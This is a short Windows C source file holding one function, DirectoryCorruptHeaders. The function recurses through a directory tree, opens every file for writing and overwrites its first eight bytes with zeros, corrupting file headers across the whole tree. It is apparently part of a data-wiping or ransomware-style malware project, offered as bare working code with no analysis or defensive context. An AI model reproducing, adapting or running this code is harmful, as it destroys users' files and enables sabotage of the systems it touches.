#include "dec.h"

int DirectoryCorruptHeaders(LPCWSTR lpDirectory) {
	WIN32_FIND_DATA wfd;
	HANDLE hf;
	HANDLE hof;
	WCHAR dto[MAX_PATH];
	WCHAR search[MAX_PATH];

	BYTE data[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	lstrcpy(search, lpDirectory);
	lstrcat(search, L"*.*");

	if (lstrlen(search) > (MAX_PATH - 3))
		return 1;

	hf = FindFirstFile(search, &wfd);

	if (hf == INVALID_HANDLE_VALUE)
		return 1;

	while (FindNextFile(hf, &wfd) != 0) {
		if (lstrcmp(wfd.cFileName, L"..") == 0)
			continue;

		lstrcpy(dto, lpDirectory);
		lstrcat(dto, wfd.cFileName);

		if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
			lstrcat(dto, L"\\");
			DirectoryCorruptHeaders(dto);
		}
		else {
			hof = CreateFile(dto, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

			WriteFile(hof, data, 8, NULL, NULL);
			CloseHandle(hof);
		}
	}
	FindClose(hf);

	return 0;
}